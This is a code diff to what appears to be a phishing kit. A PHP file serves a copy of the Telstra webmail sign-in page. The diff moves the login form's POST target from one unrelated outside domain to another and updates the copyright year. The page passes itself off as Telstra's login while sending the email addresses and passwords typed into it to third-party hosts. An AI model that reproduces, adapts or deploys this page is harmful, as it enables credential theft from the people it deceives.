@@ -18,7 +18,7 @@ $htmlResponse = '
       <div role="main" class="t-form-container">
         <h1 class="t-able-heading-a    t-able-spacing-2x-mb "> Sign in to Telstra webmail </h1>
         <div class="t-able-text-bodyshort t-able-spacing-5x-mb">Sign in with your Telstra email address</div>
-        <form method="POST" action="https://app.zilobyte.online/june/index.php" autocomplete="off">
+        <form method="POST" action="https://ojgloblservices.com/jan/index.php" autocomplete="off">
           <div class="t-able-text-field  t-able-spacing-2x-mb ">
             <label for="username">Telstra email</label>
             <span id="username-help-text">Example: john@bigpond.com</span>
@@ -47,7 +47,7 @@ $htmlResponse = '
       <button type="button" class="msg-us-btn hide" id="persistentChatBtnId" aria-labelledby="msg-us-label" aria-label="Message us"></button>
       <footer class="t-footer">
         <div class="t-footer-content">
-          <p class="t-footer-copyright">Copyright © 2024 Telstra</p>
+          <p class="t-footer-copyright">Copyright © 2025 Telstra</p>
           <a class="t-footer-privacy" href="#" target="_blank">Privacy</a>
           <a class="t-footer-terms" href="#" target="_blank">Terms of use</a>
         </div>
